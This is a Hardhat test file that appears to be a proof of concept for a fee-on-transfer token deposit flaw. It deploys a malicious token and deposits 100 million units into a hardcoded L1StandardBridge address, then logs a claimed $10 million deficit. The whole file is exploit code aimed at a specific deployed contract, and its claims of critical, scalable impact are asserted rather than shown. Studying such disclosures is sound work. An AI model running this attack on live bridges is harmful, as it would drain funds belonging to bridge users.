const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("L1StandardBridge Asset Inflation Vulnerability - High Impact Scenario", function () {
  const L1_BRIDGE_ADDRESS = "0xfd0Bf71F60660E2f608ed56e1659C450eB113120";
  // High-value deposit to demonstrate catastrophic impact
  const DEPOSIT_AMOUNT = ethers.parseEther("100000000"); // 100 Million tokens
  const FEE_PERCENTAGE = 10;

  let attacker;
  let l1Bridge;
  let maliciousToken;

  before(async function () {
    this.timeout(60000); // Increase timeout for fork setup

    [attacker] = await ethers.getSigners();

    const MaliciousTokenFactory = await ethers.getContractFactory("MaliciousToken");
    maliciousToken = await MaliciousTokenFactory.connect(attacker).deploy();
    await maliciousToken.waitForDeployment();

    const bridgeAbi = [
        "function depositERC20To(address _l1Token, address _l2Token, address _to, uint256 _amount, uint32 _l2Gas, bytes calldata _data)"
    ];
    l1Bridge = new ethers.Contract(L1_BRIDGE_ADDRESS, bridgeAbi, attacker);
  });

  it("Should create a massive deficit by depositing a large amount of fee-on-transfer tokens", async function () {
    this.timeout(60000); // Increase timeout for the test itself

    await maliciousToken.connect(attacker).approve(L1_BRIDGE_ADDRESS, DEPOSIT_AMOUNT);

    const balanceBefore = await maliciousToken.balanceOf(L1_BRIDGE_ADDRESS);
    expect(balanceBefore).to.equal(0);

    const dummyL2TokenAddress = "0x0000000000000000000000000000000000000000";
    await l1Bridge.connect(attacker).depositERC20To(
      await maliciousToken.getAddress(),
      dummyL2TokenAddress,
      attacker.address,
      DEPOSIT_AMOUNT,
      200000,
      "0x"
    );

    const balanceAfter = await maliciousToken.balanceOf(L1_BRIDGE_ADDRESS);
    const expectedAmountReceived = DEPOSIT_AMOUNT - (DEPOSIT_AMOUNT * BigInt(FEE_PERCENTAGE) / 100n);

    console.log("\n--- CATASTROPHIC VULNERABILITY CONFIRMED ---");
    console.log(`Declared Deposit Amount: ${ethers.formatUnits(DEPOSIT_AMOUNT, 18)}`);
    console.log(`Actual Amount Received by Bridge: ${ethers.formatUnits(balanceAfter, 18)}`);
    
    expect(balanceAfter).to.equal(expectedAmountReceived);
    expect(balanceAfter).to.be.lessThan(DEPOSIT_AMOUNT);

    const deficit = DEPOSIT_AMOUNT - balanceAfter;
    console.log(`\n>> Deficit Created: ${ethers.formatUnits(deficit, 18)} tokens`);
    console.log("   (Assuming a stablecoin, this represents a $10,000,000 loss in a single transaction)");
    console.log("\n>> PoC Successful. The vulnerability is scalable and critical.\n");
  });
});
